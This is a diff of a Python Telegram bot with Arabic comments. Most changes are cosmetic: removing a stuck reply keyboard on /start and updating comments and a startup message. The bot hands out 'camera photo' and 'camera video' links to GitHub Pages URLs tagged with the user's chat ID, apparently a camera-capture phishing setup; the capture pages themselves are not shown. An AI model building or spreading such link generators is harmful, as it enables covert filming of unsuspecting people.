@@ -18,9 +18,9 @@ bot = telebot.TeleBot(BOT_TOKEN)
 # مسار قاعدة بيانات الأصوات الآمن على Railway
 DB_FILE = "/tmp/voice_db.json" if os.path.exists("/tmp") else "voice_db.json"
 
-# الروابط المنفصلة والصحيحة تماماً الآن
-PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"  # الرابط الجديد الخاص بالكاميرا
-VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"     # رابط الفيديو الأصلي
+# الروابط المنفصلة والصحيحة تماماً
+PHOTO_PAGE_URL = "https://app-display.github.io/ca.html-chatld-/"
+VIDEO_PAGE_URL = "https://app-display.github.io/ca.html-chatId"
 
 user_states = {}
 user_data = {}
@@ -75,10 +75,19 @@ def get_main_keyboard():
     )
     return markup
 
-# --- استقبال أمر البدء /start ---
+# --- استقبال أمر البدء /start وتدمير الكيبورد السفلي ميكانيكياً ---
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_text = "🤖 **المطور سيف الدين يرحب بك في البوت الشامل!**\n\nالرجاء اختيار الخدمة المطلوبة من القائمة العمودية بالأسفل 👇"
+    
+    # هنا نقوم بإنشاء أمر إزالة لوحة المفاتيح تماماً من مكان الكيبورد
+    remove_keyboard = types.ReplyKeyboardRemove(selective=False)
+    
+    # نرسل أولاً رسالة سريعة ومخفية لتنظيف الواجهة وحذف القائمة السفلية العالقة
+    cleanup_msg = bot.send_message(message.chat.id, "🔄 جاري تهيئة وتنظيف القوائم...", reply_markup=remove_keyboard)
+    bot.delete_message(message.chat.id, cleanup_msg.message_id)
+    
+    # الآن نرسل القائمة العمودية النظيفة تحت الرسالة فقط
     bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
 
 # --- معالجة الضغط على الأزرار (Callback Query) ---
@@ -94,13 +103,11 @@ def handle_query(call):
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_photo_link":
-        # إرسال رابط الكاميرا الجديد مضافاً إليه chatId ليعمل بالضغط المباشر
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🖼️ **رابط كاميرا الصور الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_video_link":
-        # إرسال رابط الفيديو الأصلي مضافاً إليه chatId ليعمل بالضغط المباشر
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
         bot.send_message(chat_id, f"🎥 **رابط كاميرا الفيديو الخاص بك جاهز للفتح المباشر:**\n\n{link}", disable_web_page_preview=True)
         bot.answer_callback_query(call.id)
@@ -186,5 +193,5 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"تنبيه تهيئة: {e}")
 
-    print("🚀 تم تحديث وفصل الروابط بنجاح، البوت يعمل الآن بكفاءة...")
+    print("🚀 تم تعديل البوت وحذف القائمة السفلية المزعجة نهائياً عند التشغيل...")
     bot.polling(none_stop=True, interval=0, timeout=50)
